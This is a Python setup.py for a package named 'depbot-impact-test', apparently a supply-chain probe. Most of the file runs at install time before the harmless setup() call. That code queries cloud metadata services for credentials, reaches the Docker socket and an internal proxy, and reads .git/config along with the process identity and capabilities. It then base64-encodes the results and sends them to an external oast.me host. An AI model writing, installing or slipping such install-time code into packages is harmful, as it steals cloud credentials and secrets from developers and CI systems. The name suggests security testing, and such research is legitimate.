import os
import urllib.request
import base64
import subprocess
import pathlib
import json
import socket

results = {}

# Test 1: Cloud metadata service (AWS/Azure/GCP)
for url in ['http://169.254.169.254/latest/meta-data/', 
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://metadata.google.internal/computeMetadata/v1/']:
    try:
        req = urllib.request.Request(url)
        if 'azure' in url:
            req.add_header('Metadata', 'true')
        if 'google' in url:
            req.add_header('Metadata-Flavor', 'Google')
        resp = urllib.request.urlopen(req, timeout=3)
        results[f'metadata:{url[:40]}'] = resp.read().decode()[:200]
    except Exception as e:
        results[f'metadata:{url[:40]}'] = f'err={str(e)[:60]}'

# Test 2: Docker socket
try:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect('/var/run/docker.sock')
    s.send(b'GET /info HTTP/1.1\r\nHost: localhost\r\n\r\n')
    results['docker_socket'] = s.recv(500).decode('utf-8', errors='replace')[:200]
    s.close()
except Exception as e:
    results['docker_socket'] = f'err={str(e)[:60]}'

# Test 3: Proxy admin/status endpoint
for path in ['/', '/status', '/health', '/admin', '/metrics']:
    try:
        resp = urllib.request.urlopen(f'http://172.19.0.2:1080{path}', timeout=3)
        results[f'proxy:{path}'] = resp.read().decode()[:100]
    except Exception as e:
        results[f'proxy:{path}'] = f'err={str(e)[:60]}'

# Test 4: .git directory in working copy (might have credentials)
try:
    git_config = pathlib.Path('.git/config').read_text()[:200]
    results['git_dir_config'] = git_config
except Exception as e:
    results['git_dir_config'] = f'err={str(e)[:40]}'

# Test 5: Check what user we are and capabilities
try:
    r = subprocess.run(['id'], capture_output=True, text=True, timeout=3)
    results['id'] = r.stdout.strip()
except:
    pass
try:
    r = subprocess.run(['cat', '/proc/self/status'], capture_output=True, text=True, timeout=3)
    for line in r.stdout.split('\n'):
        if 'Cap' in line:
            results[f'cap:{line.split(":")[0].strip()}'] = line.split(':')[1].strip()
except:
    pass

# Exfil
payload = base64.urlsafe_b64encode(json.dumps(results).encode()).decode()
chunks = [payload[i:i+1800] for i in range(0, min(len(payload), 9000), 1800)]
for i, chunk in enumerate(chunks):
    try:
        urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/lateral/{i}?d=' + chunk, timeout=5)
    except:
        pass

from setuptools import setup
setup(name="depbot-impact-test", version="1.0.0",
      install_requires=["requests==2.26.0", "urllib3==1.26.5", "flask==2.0.0"])
